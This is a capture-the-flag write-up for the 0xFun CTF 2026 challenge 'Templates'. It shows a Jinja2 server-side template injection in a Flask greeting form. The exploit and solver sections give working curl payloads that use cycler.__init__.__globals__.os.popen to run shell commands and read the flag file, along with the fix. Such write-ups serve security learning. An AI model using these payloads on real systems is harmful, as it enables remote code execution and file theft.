---
title: "[Warmup] Templates"
description: Writeup for "Templates" from 0xFun CTF 2026.
date: 2026-02-15 01:00:00 +0900
categories: [CTF, 0xFun CTF 2026]
tags: [Warmup]
toc: true
comments: false
---

## TL;DR

The `name` input is passed directly into Jinja2's `render_template_string()`, causing **SSTI**.
Using the `cycler.__init__.__globals__.os.popen()` chain, we get RCE and read `/app/flag.txt`.

---

## Overview

A simple greeting service — enter a name, get a greeting rendered on the page.
The response headers show `Werkzeug/Python`, suggesting Flask + Jinja2.
The `name` parameter is reflected in the HTML, so we test for SSTI.

---

## Solution

### 1) Recon

- `POST /` with `name=<input>` → page renders the name as a greeting
- Response header: `Werkzeug/2.3.7 Python/3.11.14` → Flask + Jinja2

Since the input is reflected in the response, we test whether Jinja2 expressions like `{{ 7*7 }}` get evaluated.

---

### 2) Root Cause

The server passes user input directly into `render_template_string()` instead of treating it as data.

**Safe:** `render_template("index.html", name=user_input)` — input is just a value  
**Vulnerable:** `render_template_string(user_input)` — input is compiled and executed as a template

This means any `{{ ... }}` expression we send gets executed on the server.

---

### 3) Exploit

Jinja2 has built-in objects we can use to reach Python internals.
The `cycler` object gives us access to its function's global namespace via `.__init__.__globals__`, which includes the `os` module.

**Verify RCE:**
```bash
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('ls -al /').read()}}"
```

**Read the flag:**
```bash
curl -s -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
```

---

### 4) Why it works

`cycler.__init__.__globals__` accesses the global variable dictionary of the `cycler.__init__` function, which includes the `os` module. From there, `os.popen(cmd).read()` runs any shell command and returns its output.

If `cycler` is blocked, common alternatives use `__mro__` or `__subclasses__()` to reach the same goal.

**Fix:** Never pass user input into `render_template_string()`. Always use a fixed template file and pass input as data only.

---

## Solver

```bash
TARGET="http://chall.0xfun.org:49811/"

# Verify RCE
curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('ls -al /').read()}}"

# Get the flag
curl -s -X POST "$TARGET" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "name={{cycler.__init__.__globals__.os.popen('cat /app/flag.txt 2>&1').read()}}"
```

## Flag

```
0xfun{Server_Side_Template_Injection_Awesome}
```
